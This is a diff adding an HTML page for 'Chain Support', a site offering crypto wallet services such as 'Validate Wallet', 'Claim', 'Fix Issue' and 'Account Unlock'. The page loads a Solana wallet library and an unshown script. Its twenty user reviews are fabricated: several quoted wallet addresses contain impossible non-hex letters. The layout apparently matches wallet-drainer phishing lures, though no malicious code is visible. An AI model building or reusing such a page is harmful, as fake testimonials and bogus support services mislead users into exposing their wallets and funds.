@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Chain Support - Services</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+  <!-- Loading Overlay -->
+  <div id="loadingOverlay" class="loading-overlay hidden">
+    <div class="loading-content">
+      <div class="loading-circle"></div>
+      <div>Connecting...</div>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header>
+    <img src="/Crypto.png" class="logo" alt="logo" />
+    <h1 class="main-title">Decentralized LaunchPad</h1>
+    <img src="/Home.png" class="home-icon" alt="home" />
+  </header>
+  <hr />
+
+  <!-- Section 1: Move Headline -->
+  <section class="move-headline">
+    <div class="move-scrolling-wrapper">
+      <img src="/Move1.png" class="move-img" />
+      <img src="/Move2.png" class="move-img" />
+      <img src="/Move3.png" class="move-img" />
+      <img src="/Move4.png" class="move-img" />
+      <img src="/Move5.png" class="move-img" />
+      <img src="/Move6.png" class="move-img" />
+      <img src="/Move7.png" class="move-img" />
+      <img src="/Move8.png" class="move-img" />
+      <img src="/Move9.png" class="move-img" />
+      <img src="/Move10.png" class="move-img" />
+      <img src="/Move11.png" class="move-img" />
+      <img src="/Move12.png" class="move-img" />
+      <img src="/Move13.png" class="move-img" />
+      <img src="/Move14.png" class="move-img" />
+      <img src="/Move15.png" class="move-img" />
+      <!-- Duplicate for seamless loop -->
+      <img src="/Move1.png" class="move-img" />
+      <img src="/Move2.png" class="move-img" />
+      <img src="/Move3.png" class="move-img" />
+      <img src="/Move4.png" class="move-img" />
+      <img src="/Move5.png" class="move-img" />
+    </div>
+  </section>
+
+  <!-- Section 2: Services -->
+  <section class="services-list">
+    <h1>Our Services</h1>
+    <div class="service-block">
+      <h4>Audit</h4>
+      <p>Smart contract security audit, backdoor & tokenomics checks.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Explore dApps</h4>
+      <p>Discover DeFi, GameFi, NFT platforms, DAOs and more.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Vesting</h4>
+      <p>Track and withdraw vested tokens based on release schedules.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Claim</h4>
+      <p>Claim airdrops, staking rewards, and vesting tokens securely.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Fix Issue</h4>
+      <p>Resolve transaction failures, RPC errors, bugs and more.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Dashboard</h4>
+      <p>Access wallet insights, balances, NFTs and staking info.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Add a role</h4>
+      <p>Assign smart contract roles (admin, DAO, etc).</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Account Unlock</h4>
+      <p>Unlock DeFi/exchange accounts stuck due to 2FA or timeouts.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Transaction error</h4>
+      <p>Fix failed or stuck transactions (gas issues, nonces, etc).</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Validate Wallet</h4>
+      <p>Verify wallet ownership through cryptographic signing.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Buy/Sell NFTs</h4>
+      <p>Trade NFTs across EVM and Solana with instant execution.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Explore Tokens</h4>
+      <p>Analyze token data, contract audit info and trends.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Exchange</h4>
+      <p>Swap tokens with best routes from DEX and CEX protocols.</p>
+      <button>Click Here</button>
+    </div>
+    <div class="service-block">
+      <h4>Buy Coin</h4>
+      <p>Buy crypto with secure on-ramps (BTC, ETH, stablecoins).</p>
+      <button>Click Here</button>
+      <img src="/Buy.jpg" class="buy-img" />
+    </div>
+  </section>
+
+  <!-- Section 3: Reviews -->
+  <section class="reviews">
+    <h1>User Reviews</h1>
+    <div class="review-list" id="reviewList">
+      <div class="review-block">
+        <img src="/Review1.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x3aB1...c9F2</p>
+        <p>Chain Support’s audit service caught a critical vulnerability in my smart contract. Their expertise saved my project! <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review2.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x7eC2...a1D3</p>
+        <p>Exploring dApps was seamless with their guidance. Found amazing DeFi platforms with ease. Highly recommend! <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review3.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x9fD3...b4E6</p>
+        <p>Tracked my vested tokens effortlessly. The vesting schedule tool is super user-friendly. <span class="stars">★★★★☆</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review4.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x1bA4...f7C9</p>
+        <p>Claimed my airdrop rewards securely and quickly. Their platform made it so simple! <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review5.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x5cD5...e8B0</p>
+        <p>Fixed a transaction failure in minutes. Their support for RPC errors is top-notch. <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review6.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x8eF6...d9A1</p>
+        <p>The dashboard gave me clear insights into my wallet balances and NFTs. Very intuitive! <span class="stars">★★★★☆</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review7.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x2aB7...c0F2</p>
+        <p>Assigned a DAO role to my smart contract with ease. Great support for role management. <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review8.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x6bC8...b1E3</p>
+        <p>Unlocked my DeFi account stuck due to 2FA issues. Fast and reliable service! <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review9.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x4dD9...a2F4</p>
+        <p>Resolved a stuck transaction caused by nonce issues. Their team is amazing! <span class="stars">★★★★☆</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review10.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x3eE0...f5C5</p>
+        <p>Validated my wallet ownership securely. The cryptographic signing process was flawless. <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review11.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x7fF1...d6B6</p>
+        <p>Bought and sold NFTs on Solana with instant execution. Best trading experience! <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review12.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x9aG2...c7A7</p>
+        <p>Explored token trends and contract data easily. Their analytics tools are fantastic. <span class="stars">★★★★☆</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review13.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x1bH3...e8D8</p>
+        <p>Swapped tokens with the best DEX routes. Fast and cost-effective! <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review14.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x5cI4...b9E9</p>
+        <p>Bought ETH with their secure on-ramp. The process was quick and smooth. <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review15.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x8dJ5...a0F0</p>
+        <p>Audit service was thorough and professional. Identified tokenomics issues perfectly. <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review16.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x2eK6...f1C1</p>
+        <p>Discovered new GameFi platforms through their dApp exploration tool. Awesome experience! <span class="stars">★★★★☆</span></p>
+      </div>
+      <div class="review-block">
+        <img src="/Review17.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x6fL7...d2B2</p>
+        <p>Withdrew vested tokens on schedule with no issues. Highly reliable platform! <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block hidden" id="review18">
+        <img src="/Review18.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x4aM8...e3A3</p>
+        <p>Claimed staking rewards effortlessly. Their secure process is top-tier. <span class="stars">★★★★★</span></p>
+      </div>
+      <div class="review-block hidden" id="review19">
+        <img src="/Review19.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x9bN9...c4F4</p>
+        <p>Fixed a gas-related transaction error quickly. Amazing support team! <span class="stars">★★★★☆</span></p>
+      </div>
+      <div class="review-block hidden" id="review20">
+        <img src="/Review20.png" class="review-icon" alt="User Icon" />
+        <p class="wallet-address">0x1cO0...b5D5</p>
+        <p>Validated my wallet with ease. Their service is fast and trustworthy. <span class="stars">★★★★★</span></p>
+      </div>
+    </div>
+    <button class="gold-btn" id="showMoreBtn">Click to see more</button>
+  </section>
+  <hr />
+
+  <!-- Footer -->
+  <footer>
+    <p>&copy; 2025 Copyright | Chain Support</p>
+    <img src="/Reddit.png" />
+    <img src="/Github.png" />
+    <p>Email: Chainsupport@outlook.com</p>
+  </footer>
+
+  <!-- Wallet Dependencies -->
+  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.83.1/lib/index.iife.min.js"></script>
+  <script type="module" src="/script.js"></script>
+</body>
+</html>
